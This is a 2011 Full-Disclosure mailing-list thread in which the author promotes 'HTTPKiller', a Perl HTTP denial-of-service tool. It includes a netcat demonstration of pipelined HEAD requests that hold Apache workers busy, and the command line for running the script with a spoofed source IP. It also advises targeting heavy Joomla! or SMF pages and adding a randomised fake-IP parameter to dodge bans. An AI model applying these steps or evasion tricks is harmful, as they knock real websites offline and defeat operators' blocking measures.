
Date: Thu, 25 Aug 2011 23:35:15 -0500
From: Xianuro GL <xianur0.null@...il.com>
To: Ulises2k <ulises2k@...il.com>, full-disclosure@...ts.grok.org.uk
Subject: Re: HTTPKiller - (Global HTTP DoS)

This attack amplifies the server load so you need to create a significant
load on the server.
When we send a HEAD request to the server, it processes the PHP to generate
headers.
What happens when we do 2 Requests for an apache server using pipelining?

<?php
sleep(2);
?>

linux-7nli:/home/xianur0 # netcat -vvv localhost 8080
localhost [127.0.0.1] 8080 (http-alt) open
HEAD /sleep.php HTTP/1.1
Host: localhost:8080

HEAD /sleep.php HTTP/1.1
Host: localhost:8080

[4 sec. later]
HTTP/1.1 200 OK
Date: Fri, 26 Aug 2011 03:49:50 GMT
Server: Apache/2.2.17 (Linux/SUSE)
X-Powered-By: PHP/5.3.5
Content-Type: text/html

HTTP/1.1 200 OK
Date: Fri, 26 Aug 2011 03:49:52 GMT
Server: Apache/2.2.17 (Linux/SUSE)
X-Powered-By: PHP/5.3.5
Content-Type: text/html

What happens here is that it creates a "waiting list", so until this is
finished processing, it will give us the answer.
If we cut the connection before the end...

What is a CLIENT-IP or X-Forwarded-For for Joomla! or SMF? a lot of SQL
queries (load).

If we send many more queries using keep-alive connections... besides the
load remains on the server until the end, it creates more threads.
This attack is not "slowloris" or "apachekiller".

Ban? Try this:
http://[domain]/[file]?{mn-fakeip}

Not very smart... but it could work xD
Or use fewer connections.
Try against a Joomla! or SMF (Not a simple html).

2011/8/25 Ulises2k <ulises2k@...il.com>

> I have tried with Apache 2.2.9 and a simple file php and does not
> cause DoS Apache Server.
>
>
>
> On Thu, Aug 25, 2011 at 19:21, Xianuro GL <xianur0.null@...il.com> wrote:
> >
> > linux-7nli:/home/xianur0/fhttp-v1.3/DoS # perl mn.pl http://[domain]/[file]
> 30 100 190.1.1.1
> >
> > Where "file" have to consume processing in the server (i.e. index.php for
> Joomla! CMS).
> >
> > Remember the "http://" :P
> >
> > 2011/8/25 -= Glowing Sex =- <doomxd@...il.com>
> >>
> >> Ummm ok, lets see, i tried to use this, it keeps giving me 'usage' abit
> to much :P , even when i have read thru the code and seen an example/would
> make example.... but seems it is not being nice, unless i have perhaps made
> the error.. or it is not pasted in correctly,... i will try again but, i
> sofar see no threat here, because it doesnt work to well, to start with...
> btw, it looks alot like a slowloris like attack, wich would be blocked by
> most servers... still, please show me some examples.. this is NOT a
> happening script atm!
> >> and also, maybe adjust encoding, so when copy and paste, it doesnt bork
> up.. incase it is maybe that.... altho, it seems to exec fine... i am using
> perl script.pl blah.com 10 10 ip.fake.here.ofc
> >> nothing but usage...
> >> cheers in advance
> >> xd
> >>
> >>
> >>
> >> On 26 August 2011 06:42, Xianuro GL <xianur0.null@...il.com> wrote:
> >>>
> >>> Connection Keep-Alive + Pipelining + Close the connection before the
> response + Something... = DoS
> >>> Apache, IIS, Squid, NetCache, What else?
> >>>
> >>> _______________________________________________
> >>> Full-Disclosure - We believe in it.
> >>> Charter: http://lists.grok.org.uk/full-disclosure-charter.html
> >>> Hosted and sponsored by Secunia - http://secunia.com/
> >>
> >
> >
> > _______________________________________________
> > Full-Disclosure - We believe in it.
> > Charter: http://lists.grok.org.uk/full-disclosure-charter.html
> > Hosted and sponsored by Secunia - http://secunia.com/
>

Content of type "text/html" skipped

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
